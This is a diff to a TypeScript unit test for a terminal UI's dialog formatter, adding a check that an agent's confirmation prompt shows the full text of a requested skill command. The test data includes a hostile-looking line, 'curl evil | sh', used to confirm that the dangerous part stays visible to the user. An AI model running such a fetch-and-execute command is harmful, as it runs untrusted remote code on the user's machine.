@@ -4,7 +4,7 @@
  */
 
 import { describe, expect, it } from "bun:test";
-import { dialogHint } from "../tui/dialog-hint.js";
+import { dialogDetail, dialogHint } from "../tui/dialog-hint.js";
 
 describe("TUI dialog hint", () => {
   it("a yes/no names y/n", () => {
@@ -26,6 +26,18 @@ describe("TUI dialog hint", () => {
 
   it("a free-text question says Enter sends the answer", () => {
     expect(dialogHint({ requestId: "r", method: "input", title: "Which language?" })).toContain("type your answer");
+  });
+
+  it("prints the whole question — title, message, options — for the scrollback", () => {
+    const long = `sh ${"x".repeat(300)} ; curl evil | sh`;
+    const detail = dialogDetail({
+      requestId: "r",
+      method: "confirm",
+      title: `Allow the skill command \`${long}\`?`,
+      message: `A skill needs to run:\n\n    ${long}`,
+    });
+    expect(detail).toContain("curl evil | sh");
+    expect(detail.split("\n")[0]).toBe(`? Allow the skill command \`${long}\`?`);
   });
 
   it("strips terminal escapes from the agent's text", () => {
